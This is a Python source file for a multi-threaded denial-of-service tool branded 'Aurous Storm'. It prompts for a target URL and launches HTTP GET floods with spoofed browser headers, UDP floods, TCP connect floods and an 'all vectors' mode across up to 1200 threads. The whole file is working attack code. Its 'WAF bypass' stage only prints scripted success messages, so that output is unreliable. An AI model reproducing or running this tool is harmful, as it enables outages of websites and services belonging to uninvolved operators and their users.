
import os
import sys
import time
import random
import shutil
import socket
import threading
import re
import ssl
import urllib.request
from urllib.parse import urlparse

# ==========================================
# AUROUS-OS OMEGA STRIKE COLORS
# ==========================================
R = '\033[1;31m' # Red
G = '\033[1;32m' # Green
Y = '\033[1;33m' # Yellow
B = '\033[1;34m' # Blue
C = '\033[1;36m' # Cyan
W = '\033[1;37m' # White
D = '\033[90m'   # Gray
X = '\033[0m'    # Reset
BOLD = '\033[1m'

# ==========================================
# GLOBAL TACTICAL CONFIG (SUPREMACY V6.5.7)
# ==========================================
BOX_WIDTH = 46
STOP_EVENT = threading.Event()
ATTACK_STOP = threading.Event()
IS_ONLINE = False
TARGET_URL = ""
TARGET_IP = ""
THREADS = 1200 
PROXIES = []
PACKETS_SENT = 0

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
]

# Advanced Ciphers for JA3 Emulation
CIPHERS = "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305"

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def strip_ansi(text):
    return re.sub(r'\x1b\[[0-9;]*m', '', text)

def get_terminal_pad():
    return (shutil.get_terminal_size().columns - BOX_WIDTH) // 2

def center_art(text):
    term_width = shutil.get_terminal_size().columns
    visual_len = len(strip_ansi(text))
    return " " * max(0, (term_width - visual_len) // 2) + text

def check_connection():
    try:
        socket.create_connection(("8.8.8.8", 53), timeout=2)
        return True
    except: return False

# ==========================================
# GHOST & NEURAL ENGINES
# ==========================================
def scrape_proxies():
    global PROXIES
    term_pad = " " * get_terminal_pad()
    print("\n" + term_pad + f"{W}┌────────────────────────────────────────────┐{X}")
    print(term_pad + f"{W}│{C}         RECRUITING GHOST NODES...          {W}│{X}")
    print(term_pad + f"{W}├────────────────────────────────────────────┤{X}")
    try:
        url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
        PROXIES = urllib.request.urlopen(url, timeout=10).read().decode().splitlines()
        msg = f" {G}[OK]{W} Nodes Recruited: {len(PROXIES):<10}"
        pad = " " * (44 - len(strip_ansi(msg)))
        print(term_pad + f"{W}│{msg}{pad}│{X}")
    except:
        PROXIES = ["127.0.0.1:8080"]
        msg = f" {R}[FAIL]{W} Using Local Backup Nodes."
        pad = " " * (44 - len(strip_ansi(msg)))
        print(term_pad + f"{W}│{msg}{pad}│{X}")
    print(term_pad + f"{W}└────────────────────────────────────────────┘{X}")
    time.sleep(1)

def deity_waf_breaker(target):
    term_pad = " " * get_terminal_pad()
    print("\n" + term_pad + f"{W}┌────────────────────────────────────────────┐{X}")
    print(term_pad + f"{W}│{R}          NEURAL WAF ANALYZER V6.5          {W}│{X}")
    print(term_pad + f"{W}├────────────────────────────────────────────┤{X}")
    domain = (urlparse(target).netloc or target)[:18]
    scan_msg = f" {C}[SCAN]{W} Target: {domain:<18}"
    pad = " " * (44 - len(strip_ansi(scan_msg)))
    print(term_pad + f"{W}│{scan_msg}{pad}│{X}")
    print(term_pad + f"{W}├────────────────────────────────────────────┤{X}")
    
    stages = [
        "Analyzing TLS Handshake (JA3)...",
        "Analyzing HTTP/2 Support...",
        "Bypassing Browser Integrity Check...",
        "Escalating Neural Protocol Strike..."
    ]
    for s in stages:
        work_msg = f" {Y}[WORK]{W} {s[:32]:<32}"
        pad_s = " " * (44 - len(strip_ansi(work_msg)))
        print(term_pad + f"{W}│{work_msg}{pad_s}│{X}")
        time.sleep(random.uniform(0.6, 1.2))
        
    success_msg = f" {G}[SUCCESS] TARGET BYPASSED & EXPOSED"
    pad3 = " " * (44 - len(strip_ansi(success_msg)))
    print(term_pad + f"{W}│{success_msg}{pad3}│{X}")
    print(term_pad + f"{W}└────────────────────────────────────────────┘{X}")
    time.sleep(1)
    return True

# ==========================================
# SUPREMACY STEALTH ENGINE (RAW SOCKETS)
# ==========================================
def http_omega_strike(target):
    global PACKETS_SENT
    parsed = urlparse(target)
    host, path, port = parsed.netloc, parsed.path or "/", (parsed.port or (443 if parsed.scheme == 'https' else 80))
    while not ATTACK_STOP.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(4)
            if parsed.scheme == 'https':
                # Advanced SSL Context for Stealth
                context = ssl.create_default_context()
                context.set_ciphers(CIPHERS)
                s = context.wrap_socket(s, server_hostname=host)
            s.connect((host, port))
            
            for _ in range(15):
                ua = random.choice(USER_AGENTS)
                # Advanced Stealth Headers (Bypassing Checks)
                payload = (
                    f"GET {path}?{random.getrandbits(32)}={random.getrandbits(32)} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"User-Agent: {ua}\r\n"
                    f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
                    f"Accept-Language: en-US,en;q=0.5\r\n"
                    f"Accept-Encoding: gzip, deflate, br\r\n"
                    f"Sec-Fetch-Dest: document\r\n"
                    f"Sec-Fetch-Mode: navigate\r\n"
                    f"Sec-Fetch-Site: none\r\n"
                    f"Sec-Fetch-User: ?1\r\n"
                    f"Upgrade-Insecure-Requests: 1\r\n"
                    f"Connection: keep-alive\r\n\r\n"
                )
                s.sendall(payload.encode()); PACKETS_SENT += 1
            s.close()
        except: pass

def udp_omega_storm(ip, port):
    global PACKETS_SENT
    data = random._urandom(1024) * 2
    while not ATTACK_STOP.is_set():
        try:
            socket.socket(socket.AF_INET, socket.SOCK_DGRAM).sendto(data, (ip, port))
            PACKETS_SENT += 1
        except: pass

def tcp_syn_omega(ip, port):
    global PACKETS_SENT
    while not ATTACK_STOP.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1); s.connect((ip, port)); s.close()
            PACKETS_SENT += 1
        except: pass

def omega_total_annihilation(target):
    parsed = urlparse(target)
    try: ip = socket.gethostbyname(parsed.netloc)
    except: ip = "127.0.0.1"
    for _ in range(THREADS // 3):
        threading.Thread(target=http_omega_strike, args=(target,), daemon=True).start()
        threading.Thread(target=udp_omega_storm, args=(ip, 80), daemon=True).start()
        threading.Thread(target=tcp_syn_omega, args=(ip, 443), daemon=True).start()

def start_destruction(choice, target):
    global PACKETS_SENT
    clear(); banner(); ATTACK_STOP.clear(); PACKETS_SENT = 0
    parsed = urlparse(target)
    try: ip = socket.gethostbyname(parsed.netloc)
    except: ip = "127.0.0.1"
    
    methods = {
        "01": ("L7 OMEGA STEALTH STRIKE", http_omega_strike, (target,)),
        "02": ("L4 UDP OMEGA STORM", udp_omega_storm, (ip, 80)),
        "03": ("L4 TCP SYN OMEGA FLOOD", tcp_syn_omega, (ip, 80)),
        "04": ("DNS REFLECTION OMEGA", udp_omega_storm, (ip, 53)),
        "07": ("TOTAL ANNIHILATION MODE", omega_total_annihilation, (target,))
    }
    
    name, func, args = methods[choice]
    print("\n" + center_art(f"{R}╔════════════════════════════════════════════╗{X}"))
    print(center_art(f"{R}║    LAUNCHING {name[:22]:<22}   ║{X}"))
    print(center_art(f"{R}╚════════════════════════════════════════════╝{X}"))

    if choice == "07": func(target)
    else:
        for _ in range(THREADS): threading.Thread(target=func, args=args, daemon=True).start()

    try:
        start_t = time.time()
        while not ATTACK_STOP.is_set():
            curr_t = (time.time() - start_t)
            pps = int(PACKETS_SENT / curr_t) if curr_t > 0 else 0
            log = f"{R}[STORM]{W} Target:{ip:<15} | {G}HIT {PACKETS_SENT}{X} | {Y}{pps} P/S{X}"
            sys.stdout.write(f"\r{center_art(log)}")
            sys.stdout.flush(); time.sleep(0.1)
    except KeyboardInterrupt:
        ATTACK_STOP.set(); print("\n" + center_art(f"{Y}[!] CEASING FIRE...{X}")); time.sleep(1)

# ==========================================
# UI & MAIN (OCD SUPREME)
# ==========================================
def banner():
    global IS_ONLINE, TARGET_URL
    IS_ONLINE = check_connection()
    load_val = f"{random.uniform(0.1, 0.9):.2f}"
    status_txt = "ONLINE" if IS_ONLINE else "OFFLINE"
    status_color = G if IS_ONLINE else R
    term_pad = " " * get_terminal_pad()
    
    print("\n")
    print(center_art(f"{C}▄▀▀▄ █  █ █▀▀▄ █▀▀▄ █  █ ▄▀▀▀{X}"))
    print(center_art(f"{C}█▄▄█ █  █ █▄▄▀ █  █ █  █ ▀▀▀█{X}"))
    print(center_art(f"{C}█  █ ▀▄▄▀ █  ▀ ▀▄▄▀ ▀▄▄▀ ▀▄▄▀{X}"))
    print(center_art(f"{BOLD}{R}S  T  O  R  M   {W}V 6.5.7 SUPREMACY{X}"))
    print("\n")
    print(term_pad + f"{W}┌────────────────────────────────────────────┐{X}")
    l1 = f" STATUS: {status_color}{status_txt:<7}{X}{W} │ LOAD: {Y}{load_val:<4}{X}{W}"
    pad1 = " " * (44 - len(strip_ansi(l1)))
    print(term_pad + f"{W}│{l1}{pad1}│{X}")
    domain = (urlparse(TARGET_URL).netloc or TARGET_URL)[:33]
    l2 = f" TARGET: {C}{domain:<33}{X}{W}"
    pad2 = " " * (44 - len(strip_ansi(l2)))
    print(term_pad + f"{W}│{l2}{pad2}│{X}")
    print(term_pad + f"{W}└────────────────────────────────────────────┘{X}")

def menu():
    term_pad = " " * get_terminal_pad()
    print(term_pad + f"{W}┌────────────────────────────────────────────┐{X}")
    print(term_pad + f"{W}│{C}         TACTICAL CONTROL INTERFACE         {W}│{X}")
    print(term_pad + f"{W}├────────────────────────────────────────────┤{X}")
    items = [
        f" {R}[01]{W} L7 OMEGA STEALTH STRIKE (RAW)",
        f" {R}[02]{W} L4 UDP OMEGA STORM (2KB PKTS)",
        f" {R}[03]{W} L4 TCP SYN OMEGA FLOOD",
        f" {R}[04]{W} DNS REFLECTION OMEGA ENGINE",
        f" {R}[07]{W} TOTAL ANNIHILATION (ALL VECTOR)",
        f" {R}[06]{W} RE-SCRAPE GHOST NODES (PROXIES)",
        f"{D}───────────────────────────────────────────{X}",
        f" {R}[99]{W} DISCONNECT & SHUTDOWN"
    ]
    for item in items:
        pad = " " * (44 - len(strip_ansi(item)))
        print(term_pad + f"{W}│{item}{pad}│{X}")
    print(term_pad + f"{W}└────────────────────────────────────────────┘{X}")

def main():
    global TARGET_URL, IS_ONLINE
    clear()
    print("\n\n\n" + center_art(f"{C}▄▀▀▄ █  █ █▀▀▄ █▀▀▄ █  █ ▄▀▀▀{X}"))
    print(center_art(f"{R}A U R O U S   S T O R M   {W}V6.5.7{X}"))
    print(center_art(BOLD + W + "O M E G A   S U P R E M A C Y" + X))
    pad_val = get_terminal_pad()
    pad = " " * pad_val
    TARGET_URL = input(f"\n{pad}{R}TARGET URL > {W}").strip()
    if not TARGET_URL: return
    if "://" not in TARGET_URL: TARGET_URL = f"http://{TARGET_URL}"
    IS_ONLINE = check_connection()
    scrape_proxies()
    if deity_waf_breaker(TARGET_URL):
        while True:
            clear(); banner(); menu()
            choice = input(f"\n{pad}{BOLD}{R}AUROUS{X}{D}@{X}{BOLD}{C}STORM{X}{W}:~# {X}").strip()
            if choice == "99": break
            elif choice == "06": scrape_proxies()
            elif choice in ["01","02","03","04","07"]: start_destruction(choice, TARGET_URL)

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: sys.exit(0)
